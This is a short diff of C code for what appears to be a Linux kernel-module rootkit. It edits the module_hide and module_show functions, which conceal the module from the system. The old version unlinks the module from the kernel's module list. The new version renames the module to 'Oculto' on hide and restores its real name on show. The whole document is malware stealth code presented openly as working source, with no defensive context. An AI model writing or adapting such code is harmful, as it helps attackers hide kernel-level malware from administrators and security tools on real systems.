@@ -296,16 +296,18 @@ static short module_hidden = 0;
 void
 module_show(void)
 {
-	list_add(&THIS_MODULE->list, module_previous);
-	module_hidden = 0;
+    strncpy(THIS_MODULE->name, MODULE_NAME, sizeof(THIS_MODULE->name) - 1);
+    list_add(&THIS_MODULE->list, module_previous);
+    module_hidden = 0;
 }
 
 void
 module_hide(void)
 {
-	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	module_hidden = 1;
+    module_previous = THIS_MODULE->list.prev;
+    strncpy(THIS_MODULE->name, "Oculto", sizeof(THIS_MODULE->name) - 1);
+    THIS_MODULE->name[sizeof(THIS_MODULE->name) - 1] = '\0';
+    module_hidden = 1;
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
